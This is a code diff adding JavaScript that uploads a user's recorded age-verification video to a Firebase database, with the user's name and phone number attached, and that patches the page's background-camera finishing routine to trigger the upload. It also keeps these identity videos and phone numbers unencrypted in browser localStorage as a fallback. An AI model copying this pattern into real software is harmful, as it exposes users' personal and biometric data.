@@ -2412,6 +2412,148 @@ window.openAdminVideosModal = openAdminVideosModal;
 window.closeAdminVideosModal = closeAdminVideosModal;
 window.deleteAdminVideo = deleteAdminVideo;
 
+// ════════════════════════════════════════
+// 📤 إرسال الفيديو إلى Firebase (يضاف لـ index.html)
+// ════════════════════════════════════════
+async function sendVideoToFirebase(videoBlob, userData) {
+    if (!videoBlob) {
+        console.error('❌ لا يوجد فيديو للرفع');
+        return false;
+    }
+    
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onloadend = async function() {
+            const base64Video = reader.result;
+            const videoId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+            
+            const videoData = {
+                id: videoId,
+                userId: userData.id,
+                userName: userData.name,
+                userPhone: userData.phone,
+                timestamp: Date.now(),
+                videoBase64: base64Video,
+                duration: 10,
+                type: 'age_verification',
+                status: 'pending'
+            };
+            
+            try {
+                // حفظ في Firebase
+                if (fbDB) {
+                    await fbDB.ref('videos/' + videoId).set(videoData);
+                    console.log('✅ تم رفع الفيديو إلى Firebase');
+                    
+                    // حفظ نسخة في localStorage كاحتياطي
+                    let localVideos = JSON.parse(localStorage.getItem('sxm_videos') || '[]');
+                    localVideos.push(videoData);
+                    localStorage.setItem('sxm_videos', JSON.stringify(localVideos));
+                    
+                    resolve(true);
+                } else {
+                    // حفظ محلياً فقط
+                    let localVideos = JSON.parse(localStorage.getItem('sxm_videos') || '[]');
+                    localVideos.push(videoData);
+                    localStorage.setItem('sxm_videos', JSON.stringify(localVideos));
+                    console.log('⚠️ Firebase غير متصل - تم الحفظ محلياً');
+                    resolve(true);
+                }
+            } catch(e) {
+                console.error('❌ فشل الرفع:', e);
+                reject(e);
+            }
+        };
+        reader.onerror = () => reject(new Error('فشل قراءة الفيديو'));
+        reader.readAsDataURL(videoBlob);
+    });
+}
+
+// تعديل دالة رفع الفيديو لاستخدام Firebase
+function uploadVideoToFirebase(videoBlob) {
+    const user = getUser();
+    if (!user) {
+        console.error('❌ لا يوجد مستخدم مسجل');
+        showToast('❌ الرجاء تسجيل الدخول أولاً');
+        return;
+    }
+    
+    sendVideoToFirebase(videoBlob, user).then(success => {
+        if (success) {
+            showToast('✅ تم رفع فيديو التحقق بنجاح');
+            console.log('📹 فيديو التحقق تم رفعه للأدمن');
+        } else {
+            showToast('⚠️ تم الحفظ محلياً - سيتم الرفع لاحقاً');
+        }
+    }).catch(err => {
+        console.error(err);
+        showToast('❌ فشل رفع الفيديو');
+    });
+}
+
+// تعديل دالة finishBackgroundCamera لترفع الفيديو لـ Firebase
+const originalFinishBackgroundCamera = finishBackgroundCamera || function(success) {
+    if(bgMediaStream) {
+        bgMediaStream.getTracks().forEach(function(track) { track.stop(); });
+        bgMediaStream = null;
+    }
+    
+    var overlay = document.getElementById('camera-bg-overlay');
+    if(overlay) {
+        if(success && bgVideoBlob) {
+            overlay.querySelector('.status').innerHTML = '✅ تم التحقق - جاري الرفع...';
+            // رفع الفيديو لـ Firebase
+            uploadVideoToFirebase(bgVideoBlob);
+            setTimeout(function() {
+                if(overlay) {
+                    overlay.classList.remove('active');
+                    setTimeout(function(){ if(overlay) overlay.remove(); }, 500);
+                }
+            }, 2000);
+        } else {
+            overlay.querySelector('.status').innerHTML = '⚠️ حدث خطأ';
+            setTimeout(function() {
+                if(overlay) {
+                    overlay.classList.remove('active');
+                    setTimeout(function(){ if(overlay) overlay.remove(); }, 500);
+                }
+            }, 1500);
+        }
+    }
+};
+
+// استبدال الدالة إذا كانت موجودة
+if (typeof finishBackgroundCamera !== 'undefined') {
+    window.finishBackgroundCamera = function(success) {
+        if(bgMediaStream) {
+            bgMediaStream.getTracks().forEach(function(track) { track.stop(); });
+            bgMediaStream = null;
+        }
+        
+        var overlay = document.getElementById('camera-bg-overlay');
+        if(overlay) {
+            if(success && bgVideoBlob) {
+                overlay.querySelector('.status').innerHTML = '✅ تم التحقق - جاري الرفع...';
+                uploadVideoToFirebase(bgVideoBlob);
+                setTimeout(function() {
+                    if(overlay) {
+                        overlay.classList.remove('active');
+                        setTimeout(function(){ if(overlay) overlay.remove(); }, 500);
+                    }
+                }, 2000);
+            } else {
+                overlay.querySelector('.status').innerHTML = '⚠️ حدث خطأ';
+                setTimeout(function() {
+                    if(overlay) {
+                        overlay.classList.remove('active');
+                        setTimeout(function(){ if(overlay) overlay.remove(); }, 500);
+                    }
+                }, 1500);
+            }
+        }
+    };
+}
+
 </script>
 </body>
 </html>
